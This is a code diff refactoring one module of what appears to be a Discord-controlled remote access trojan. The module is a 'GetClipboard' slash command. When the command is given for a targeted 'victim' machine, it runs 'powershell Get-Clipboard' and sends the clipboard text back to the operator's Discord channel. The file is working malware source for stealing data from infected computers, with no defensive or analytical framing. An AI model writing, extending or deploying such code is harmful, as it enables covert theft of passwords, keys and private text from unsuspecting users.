@@ -10,21 +10,25 @@ class GetClipboard(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Sends text contents of clipboard",
-        options=[bot.victim],
-    )
-    async def get_clipboard(ctx, victim):
-        if str(victim) == str(ip_addr):
+    @commands.slash_command( )
+    async def get_clipboard(self, ctx, victim):
+        """Sends current text stored in user clipboard
+    
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             outp = os.popen("powershell Get-Clipboard").read()
             if len(outp) > 1000:
                 return await ctx.followup.send(f"```{outp}```")
-            embed = genEmbed( "Clipboard contents", datetime.now() )
-            embed.add_field(
-                name="Clipboard:", 
-                value=f"```{outp}```" if outp != "" else "No text in clipboard"
+                
+            embed = self.bot.genEmbed( 
+                "Clipboard contents", 
+                datetime.now(), 
+                f"```{outp}```" if outp != "" else "No text in clipboard"
             )
             
             await ctx.followup.send(embed=embed)
